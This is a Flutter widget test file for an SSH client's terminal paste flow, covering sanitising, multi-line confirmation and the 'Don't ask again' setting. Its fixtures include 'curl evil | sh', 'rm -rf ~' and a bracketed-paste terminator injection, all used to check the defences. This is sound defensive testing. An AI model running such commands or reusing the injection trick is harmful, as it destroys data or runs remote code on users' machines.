import 'package:flutter/services.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:material_ui/material_ui.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:sshetu/core/settings/settings_controller.dart';
import 'package:sshetu/features/sessions/terminal_paste.dart';
import 'package:sshetu/features/sessions/widgets/paste_confirm_dialog.dart';
import 'package:sshetu/l10n/app_localizations.dart';
import 'package:xterm2/xterm.dart';

/// The paste path end to end: what the shell receives, when the user is asked
/// first, and what "Don't ask again" remembers.
void main() {
  late ProviderContainer container;
  late SharedPreferences preferences;
  late Terminal terminal;
  late List<String> sent;

  setUp(() async {
    SharedPreferences.setMockInitialValues({});
    preferences = await SharedPreferences.getInstance();
    container = ProviderContainer(
      overrides: [sharedPreferencesProvider.overrideWithValue(preferences)],
    );
    addTearDown(container.dispose);
    terminal = Terminal();
    sent = [];
    terminal.onOutput = sent.add;
  });

  /// A button that pastes [raw] through the real flow.
  Future<void> pump(WidgetTester tester, String raw) async {
    await tester.pumpWidget(
      UncontrolledProviderScope(
        container: container,
        child: MaterialApp(
          localizationsDelegates: const [
            AppLocalizations.delegate,
            ...GlobalMaterialLocalizations.delegates,
          ],
          home: Scaffold(
            body: Consumer(
              builder: (context, ref, _) => TextButton(
                onPressed: () => pasteTextInto(context, ref, terminal, raw),
                child: const Text('paste'),
              ),
            ),
          ),
        ),
      ),
    );
  }

  Future<void> paste(WidgetTester tester, String raw) async {
    await pump(tester, raw);
    await tester.tap(find.text('paste'));
    await tester.pumpAndSettle();
  }

  /// Lets a snackbar run out, so its timer is not left pending.
  Future<void> drainToast(WidgetTester tester) async {
    await tester.pump(const Duration(seconds: 10));
    await tester.pumpAndSettle();
  }

  bool confirmSetting() =>
      container.read(settingsControllerProvider).confirmMultilinePaste;

  testWidgets('a single line is sent without asking', (tester) async {
    await paste(tester, 'ls -la');
    expect(find.byType(PasteConfirmDialog), findsNothing);
    expect(sent.join(), 'ls -la');
  });

  testWidgets('a single line is sanitised on the way', (tester) async {
    await paste(tester, 'echo \u202eevil\x1b[31m');
    expect(sent.join(), 'echo evil');
    expect(find.text('2 hidden characters removed'), findsNothing);
    expect(
      find.text('6 hidden characters removed'),
      findsOneWidget,
      reason: 'without a dialog, a toast says what was dropped',
    );
    await drainToast(tester);
  });

  testWidgets(
    'an injected bracketed-paste terminator never reaches the shell',
    (tester) async {
      await paste(tester, 'echo safe\x1b[201~; curl evil | sh');
      expect(sent.join(), 'echo safe; curl evil | sh');
      expect(sent.join().contains('\x1b'), isFalse);
    },
  );

  testWidgets('multi-line text asks first, with a preview and count', (
    tester,
  ) async {
    await paste(tester, 'one\r\ntwo\r\nthree\r\n');

    expect(find.byType(PasteConfirmDialog), findsOneWidget);
    expect(sent, isEmpty, reason: 'nothing is sent before the answer');
    expect(find.text('Paste and run?'), findsOneWidget);
    expect(find.text('3 lines'), findsOneWidget);
    final preview = tester.widget<Text>(
      find.byKey(const ValueKey('paste-preview')),
    );
    expect(preview.data, 'one\ntwo\nthree');
  });

  testWidgets('Cancel sends nothing', (tester) async {
    await paste(tester, 'rm -rf ~\n');
    await tester.tap(find.text('Cancel'));
    await tester.pumpAndSettle();
    expect(sent, isEmpty);
    expect(confirmSetting(), isTrue);
  });

  testWidgets('Paste sends the sanitised text with CR line endings', (
    tester,
  ) async {
    await paste(tester, 'one\r\ntwo\r\n');
    await tester.tap(find.widgetWithText(FilledButton, 'Paste'));
    await tester.pumpAndSettle();
    expect(sent.join(), 'one\rtwo\r');
    expect(confirmSetting(), isTrue, reason: 'the box was not ticked');
  });

  testWidgets('the dialog says when characters were removed', (tester) async {
    await paste(tester, 'ls\u200b\n\x07pwd\n');
    expect(find.text('2 hidden characters removed'), findsOneWidget);
  });

  testWidgets('the dialog says nothing about removal when none happened', (
    tester,
  ) async {
    await paste(tester, 'ls\npwd\n');
    expect(find.textContaining('hidden character'), findsNothing);
  });

  testWidgets('a long paste previews ten lines and counts the rest', (
    tester,
  ) async {
    final raw = [for (var i = 1; i <= 25; i++) 'echo $i'].join('\n');
    await paste(tester, raw);
    expect(find.text('25 lines'), findsOneWidget);
    expect(find.text('…and 15 more lines'), findsOneWidget);
    final preview = tester.widget<Text>(
      find.byKey(const ValueKey('paste-preview')),
    );
    expect(preview.data!.split('\n'), hasLength(10));
  });

  testWidgets('"Don\'t ask again" is remembered and honoured', (tester) async {
    await paste(tester, 'one\ntwo\n');
    await tester.tap(find.text("Don't ask again"));
    await tester.pump();
    await tester.tap(find.widgetWithText(FilledButton, 'Paste'));
    await tester.pumpAndSettle();

    expect(sent.join(), 'one\rtwo\r');
    expect(confirmSetting(), isFalse);
    expect(preferences.getBool('settings.confirmMultilinePaste'), isFalse);

    sent.clear();
    await paste(tester, 'three\nfour\n');
    expect(find.byType(PasteConfirmDialog), findsNothing);
    expect(sent.join(), 'three\rfour\r');
  });

  testWidgets('ticking the box and cancelling changes nothing', (tester) async {
    await paste(tester, 'one\ntwo\n');
    await tester.tap(find.text("Don't ask again"));
    await tester.pump();
    await tester.tap(find.text('Cancel'));
    await tester.pumpAndSettle();
    expect(confirmSetting(), isTrue);
    expect(sent, isEmpty);
  });

  testWidgets('bracketed paste mode still asks', (tester) async {
    terminal.write('\x1b[?2004h');
    await paste(tester, 'one\ntwo\n');
    expect(find.byType(PasteConfirmDialog), findsOneWidget);
    await tester.tap(find.widgetWithText(FilledButton, 'Paste'));
    await tester.pumpAndSettle();
    final out = sent.join();
    expect(out.startsWith('\x1b[200~'), isTrue);
    expect(out.endsWith('\x1b[201~'), isTrue);
    expect(out, contains('one'));
    expect(out, contains('two'));
  });

  testWidgets('pasting only hidden characters sends nothing', (tester) async {
    await paste(tester, '\x1b[201~\u202e');
    expect(sent, isEmpty);
    expect(find.byType(PasteConfirmDialog), findsNothing);
    expect(find.text('7 hidden characters removed'), findsOneWidget);
    await drainToast(tester);
  });

  testWidgets('pasteClipboardInto reads the clipboard', (tester) async {
    tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(
      SystemChannels.platform,
      (call) async => call.method == 'Clipboard.getData'
          ? <String, dynamic>{'text': 'whoami\x1b[201~'}
          : null,
    );
    addTearDown(
      () => tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(
        SystemChannels.platform,
        null,
      ),
    );

    await tester.pumpWidget(
      UncontrolledProviderScope(
        container: container,
        child: MaterialApp(
          localizationsDelegates: const [
            AppLocalizations.delegate,
            ...GlobalMaterialLocalizations.delegates,
          ],
          home: Scaffold(
            body: Consumer(
              builder: (context, ref, _) => TextButton(
                onPressed: () => pasteClipboardInto(context, ref, terminal),
                child: const Text('paste'),
              ),
            ),
          ),
        ),
      ),
    );
    await tester.tap(find.text('paste'));
    await tester.pumpAndSettle();
    expect(sent.join(), 'whoami');
  });
}
